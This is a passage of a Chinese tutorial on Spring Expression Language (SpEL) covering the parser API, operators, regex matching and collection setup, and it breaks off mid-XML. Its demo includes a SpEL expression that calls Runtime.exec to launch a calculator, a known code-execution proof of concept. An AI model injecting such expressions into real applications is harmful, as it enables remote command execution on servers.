- ExpressionParser 接口：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；  
  
- EvaluationContext 接口：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。  
  
- Expression 接口：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。  
  
##### Demo  
  
应用示例如下，和前面XML配置的用法区别在于程序会将这里传入parseExpression()函数的字符串参数当初SpEL表达式来解析，而无需通过#{}符号来注明：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">// 字符串字面量</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">//String spel = &#34;123+456&#34;;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">// 算数运算</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">//String spel = &#34;123+456&#34;;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">// 操作类弹计算器，当然java.lang包下的类是可以省略包名的</span></span><br/><span style="height: 20px;line-height: 20px;">String spel = <span style="color: rgb(26, 188, 156);">&#34;T(java.lang.Runtime).getRuntime().exec(\&#34;calc\&#34;)&#34;</span>;</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">// String spel = &#34;T(java.lang.Runtime).getRuntime().exec(\&#34;calc\&#34;)&#34;;</span></span><br/><span style="height: 20px;line-height: 20px;">ExpressionParser parser = <span style="color: rgb(233, 105, 0);">new</span> SpelExpressionParser();</span><br/><span style="height: 20px;line-height: 20px;">Expression expression = parser.parseExpression(spel);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(expression.getValue());</span><br/></pre></td></tr></tbody></table>##### 类实例化  
  
类实例化同样使用Java关键字new，类名必须是全限定名，但java.lang包内的类型除外。  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">String spel = <span style="color: rgb(26, 188, 156);">&#34;new java.util.Date()&#34;</span>;</span><br/><span style="height: 20px;line-height: 20px;">ExpressionParser parser = <span style="color: rgb(233, 105, 0);">new</span> SpelExpressionParser();</span><br/><span style="height: 20px;line-height: 20px;">Expression expression = parser.parseExpression(spel);</span><br/><span style="height: 20px;line-height: 20px;">System.out.println(expression.getValue());</span><br/></pre></td></tr></tbody></table>### SpEL表达式运算  
  
下面内容引用自SpEL表达式。  
  
SpEL提供了以下几种运算符：  
<table><thead><tr style="border-top: 1px solid rgb(204, 204, 204);"><th style="padding: 6px 13px;border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(246, 248, 250);">运算符类型</th><th style="padding: 6px 13px;border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(246, 248, 250);">运算符</th></tr></thead><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">算数运算</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">+, -, *, /, %, ^</td></tr><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">关系运算</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">&lt;, &gt;, ==, &lt;=, &gt;=, lt, gt, eq, le, ge</td></tr><tr style="border-top: 1px solid rgb(204, 204, 204);"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">逻辑运算</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">and, or, not, !</td></tr><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">条件运算</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">?:(ternary), ?:(Elvis)</td></tr><tr style="border-top: 1px solid rgb(204, 204, 204);"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">正则表达式</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">matches</td></tr></tbody></table>#### 算数运算  
  
加法运算：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;add&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{counter.total+42}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
加号还可以用于字符串拼接：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;blogName&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{my blog name is+&#39; &#39;+mrBird }&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
^运算符执行幂运算，其余算数运算符和Java一毛一样，这里不再赘述。  
#### 关系运算  
  
判断一个Bean的某个属性是否等于100：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;eq&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{counter.total==100}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
返回值是boolean类型。关系运算符唯一需要注意的是：在Spring XML配置文件中直接写>=和<=会报错。因为这”<”和”>”两个符号在XML中有特殊的含义。所以实际使用时，最号使用文本类型代替符号：  
<table><thead><tr style="border-top: 1px solid rgb(204, 204, 204);"><th style="padding: 6px 13px;border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(246, 248, 250);">运算符</th><th style="padding: 6px 13px;border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(246, 248, 250);">符号</th><th style="padding: 6px 13px;border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(246, 248, 250);">文本类型</th></tr></thead><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">等于</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">==</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">eq</td></tr><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">小于</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">&lt;</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">lt</td></tr><tr style="border-top: 1px solid rgb(204, 204, 204);"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">小于等于</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">&lt;=</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">le</td></tr><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">大于</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">&gt;</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">gt</td></tr><tr style="border-top: 1px solid rgb(204, 204, 204);"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">大于等于</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">&gt;=</td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);">ge</td></tr></tbody></table>  
如：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;eq&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{counter.total le 100}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>#### 逻辑运算  
  
SpEL表达式提供了多种逻辑运算符，其含义和Java也是一毛一样，只不过符号不一样罢了。  
  
使用and运算符：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;largeCircle&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{shape.kind == &#39;circle&#39; and shape.perimeter gt 10000}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
两边为true时才返回true。  
  
其余操作一样，只不过非运算有not和!两种符号可供选择。非运算：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;outOfStack&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{!product.available}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>#### 条件运算  
  
条件运算符类似于Java的三目运算符：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;instrument&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{songSelector.selectSong() == &#39;May Rain&#39; ? piano:saxphone}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
当选择的歌曲为”May Rain”的时候，一个id为piano的Bean将装配到instrument属性中，否则一个id为saxophone的Bean将装配到instrument属性中。注意区别piano和字符串“piano”！  
  
一个常见的三目运算符的使用场合是判断是否为null值：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;song&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{kenny.song !=null ? kenny.song:&#39;Jingle Bells&#39;}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
这里，kenny.song引用重复了两次，SpEL提供了三目运算符的变体来简化表达式：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;song&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{kenny.song !=null ?:&#39;Jingle Bells&#39;}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
在以上示例中，如果kenny.song不为null，那么表达式的求值结果是kenny.song否则就是“Jingle Bells”。  
#### 正则表达式  
  
验证邮箱：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;email&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{admin.email matches &#39;[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.com&#39;}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
虽然这个邮箱正则不够健壮，但对于演示matches来说足够啦。  
### 集合操作  
  
SpEL表达式支持对集合进行操作。  
  
下面我们以示例看下能进行哪些集合操作。  
  
我们先创建一个City类：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/><span style="height: 20px;line-height: 20px;">14</span><br/><span style="height: 20px;line-height: 20px;">15</span><br/><span style="height: 20px;line-height: 20px;">16</span><br/><span style="height: 20px;line-height: 20px;">17</span><br/><span style="height: 20px;line-height: 20px;">18</span><br/><span style="height: 20px;line-height: 20px;">19</span><br/><span style="height: 20px;line-height: 20px;">20</span><br/><span style="height: 20px;line-height: 20px;">21</span><br/><span style="height: 20px;line-height: 20px;">22</span><br/><span style="height: 20px;line-height: 20px;">23</span><br/><span style="height: 20px;line-height: 20px;">24</span><br/><span style="height: 20px;line-height: 20px;">25</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> City </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(233, 105, 0);">private</span> String name;</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(233, 105, 0);">private</span> String state;</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(233, 105, 0);">private</span> <span style="color: rgb(233, 105, 0);">int</span> population;</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> String getName() </span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">return</span> name;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">void</span> setName(String name) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">this</span>.name = name;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> String getState() </span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">return</span> state;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">void</span> setState(String state) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">this</span>.state = state;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">int</span> getPopulation() </span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">return</span> population;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">void</span> setPopulation(<span style="color: rgb(0, 146, 219);">int</span> population) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">this</span>.population = population;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
修改Beans.xml，使用<util:list>元素配置一个包含City对象的List集合：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/><span style="height: 20px;line-height: 20px;">14</span><br/><span style="height: 20px;line-height: 20px;">15</span><br/><span style="height: 20px;line-height: 20px;">16</span><br/><span style="height: 20px;line-height: 20px;">17</span><br/><span style="height: 20px;line-height: 20px;">18</span><br/><span style="height: 20px;line-height: 20px;">19</span><br/><span style="height: 20px;line-height: 20px;">20</span><br/><span style="height: 20px;line-height: 20px;">21</span><br/><span style="height: 20px;line-height: 20px;">22</span><br/><span style="height: 20px;line-height: 20px;">23</span><br/><span style="height: 20px;line-height: 20px;">24</span><br/><span style="height: 20px;line-height: 20px;">25</span><br/><span style="height: 20px;line-height: 20px;">26</span><br/><span style="height: 20px;line-height: 20px;">27</span><br/><span style="height: 20px;line-height: 20px;">28</span><br/><span style="height: 20px;line-height: 20px;">29</span><br/><span style="height: 20px;line-height: 20px;">30</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: 